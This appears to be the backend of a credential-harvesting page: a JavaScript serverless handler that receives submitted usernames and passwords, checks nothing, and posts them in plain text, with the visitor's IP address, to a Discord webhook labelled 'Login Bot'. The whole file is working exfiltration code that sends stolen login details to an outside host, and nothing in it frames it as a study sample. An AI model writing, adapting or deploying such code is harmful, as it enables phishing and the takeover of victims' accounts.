export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
    const { username, password, timestamp } = req.body;

    const message = {
        username: "Login Bot",
        content: "```" + 
                 "🔐 New Login Attempt\n" +
                 "⏰ Time: " + timestamp + "\n" +
                 "👤 Username: " + username + "\n" +
                 "🔑 Password: " + password + "\n" +
                 "🌐 IP: " + (req.headers['x-forwarded-for'] || req.socket.remoteAddress) +
                 "```",
        embeds: [{
            title: "New Login Attempt",
            color: 0xFF0000,
            fields: [
                {
                    name: "Username",
                    value: username,
                    inline: true
                },
                {
                    name: "Password",
                    value: password,
                    inline: true
                },
                {
                    name: "Time",
                    value: timestamp,
                    inline: false
                }
            ]
        }]
    };

    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message)
        });

        if (!response.ok) throw new Error('Discord webhook failed');
        
        res.status(200).json({ success: true });
    } catch (error) {
        res.status(500).json({ error: 'Failed to process login' });
    }
}